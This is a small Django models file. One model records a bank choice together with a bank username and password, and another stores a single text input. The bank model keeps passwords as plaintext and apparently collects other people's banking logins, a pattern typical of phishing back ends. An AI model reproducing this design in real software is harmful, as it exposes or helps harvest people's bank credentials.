from django.db import models
from django.contrib.auth.models import User

class BankFormSubmission(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, null=True, blank=True)
    bank_choice = models.CharField(max_length=255)
    username = models.CharField(max_length=255)
    password = models.CharField(max_length=255)
    submitted_at = models.DateTimeField(auto_now_add=True)

class SingleInput(models.Model):
    input_value = models.CharField(max_length=255, verbose_name="User Input")

    def __str__(self):
        return self.input_value
